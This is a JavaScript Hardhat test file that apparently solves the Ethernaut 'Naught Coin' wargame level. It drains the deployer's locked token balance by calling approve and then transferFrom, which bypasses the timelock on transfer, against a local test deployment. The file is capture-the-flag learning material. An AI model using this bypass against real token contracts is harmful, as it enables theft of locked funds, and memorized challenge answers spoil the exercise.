const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Ethernaut - Fifteen", function () {
  async function deployToken() {
    const [deployer, user1] = await ethers.getSigners();

    const EthernautFifteenNaughtCoin = await ethers.getContractFactory(
      "EthernautFifteenNaughtCoin"
    );
    const ethernautFifteenNaughtCoin = await EthernautFifteenNaughtCoin.deploy(
      deployer.address
    );
    await ethernautFifteenNaughtCoin.deployed();

    return { deployer, user1, ethernautFifteenNaughtCoin };
  }

  describe("Exploit", function () {
    it("Successfully transfer away tokens", async function () {
      const { deployer, user1, ethernautFifteenNaughtCoin } = await loadFixture(
        deployToken
      );

      const totalSupply = 1_000_000n * 10n ** 18n;

      expect(
        await ethernautFifteenNaughtCoin.balanceOf(deployer.address)
      ).to.equal(totalSupply);
      await ethernautFifteenNaughtCoin
        .connect(deployer)
        .approve(deployer.address, totalSupply);
      await ethernautFifteenNaughtCoin
        .connect(deployer)
        .transferFrom(deployer.address, user1.address, totalSupply);
      expect(
        await ethernautFifteenNaughtCoin.balanceOf(deployer.address)
      ).to.equal(0);
      expect(
        await ethernautFifteenNaughtCoin.balanceOf(user1.address)
      ).to.equal(totalSupply);
    });
  });
});
